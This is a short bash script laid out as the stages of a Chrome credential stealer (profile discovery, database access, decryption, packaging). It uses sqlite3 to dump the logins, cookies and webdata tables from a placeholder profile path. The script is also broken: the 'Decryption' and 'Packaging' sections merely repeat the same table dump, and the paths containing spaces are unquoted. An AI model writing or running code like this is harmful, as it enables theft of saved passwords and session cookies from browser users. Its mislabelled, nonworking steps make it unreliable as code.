#!/bin/bash

# Profile Discovery
if [ -d "/path/to/chrome/User Data" ]; then
  echo "Chrome profile found at /path/to/chrome/User Data"
else
  echo "No Chrome profile found"
  exit 0
fi

# Database Access
for f in /path/to/chrome/User Data/*.db; do
    if [ -f $f ]; then
        sqlite3 $f << EOF
        .header on
        SELECT * FROM logins;
        .header off
EOF
    fi
done

# Decryption
for f in /path/to/chrome/User Data/*.db; do
    if [ -f $f ]; then
        sqlite3 $f << EOF
        .header on
        SELECT * FROM cookies;
        .header off
EOF
    fi
done

# Packaging
for f in /path/to/chrome/User Data/*.db; do
    if [ -f $f ]; then
        sqlite3 $f << EOF
        .header on
        SELECT * FROM webdata;
        .header off
EOF
    fi
done
